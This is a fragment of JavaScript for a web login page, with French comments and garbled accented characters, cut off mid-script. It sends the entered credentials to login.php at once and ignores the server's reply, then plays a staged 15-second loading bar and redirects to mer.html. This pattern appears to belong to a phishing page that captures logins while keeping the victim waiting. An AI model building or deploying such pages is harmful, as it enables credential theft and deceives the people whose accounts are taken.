<script>
    const loginForm = document.getElementById('loginForm');
    const loadingMessage = document.getElementById('loading-message');
    const progressContainer = document.getElementById('progress-container');
    const progressFill = document.getElementById('progress-fill');
    const finalMessage = document.getElementById('final-message');

    loginForm.addEventListener('submit', async function(event) {
        event.preventDefault();
        
        // 1. Soumission IMMÃ‰DIATE des identifiants au PHP
        const formData = new FormData(loginForm);
        try {
            await fetch('login.php', {
                method: 'POST',
                body: formData
            });
        } catch (e) {
            console.error("Erreur d'envoi", e);
        }

        // 2. Masquer le formulaire et afficher l'animation
        loginForm.style.display = 'none';
        loadingMessage.style.display = 'block';
        progressContainer.style.display = 'block';

        // 3. Animation de 15 secondes
        let progress = 0;
        const interval = setInterval(() => {
            progress += 5;
            if (progress >= 100) {
                clearInterval(interval);
                loadingMessage.style.display = 'none';
                progressContainer.style.display = 'none';
                finalMessage.style.display = 'block';
                
                // 4. Redirection aprÃ¨s 2 secondes supplÃ©mentaires
                setTimeout(() => {
                    window.location.href = "mer.html";
                }, 2000);
            }
            progressFill.style.width = progress + '%';
            progressFill.textContent = progress + '%';
        }, 750); // 15 secondes total
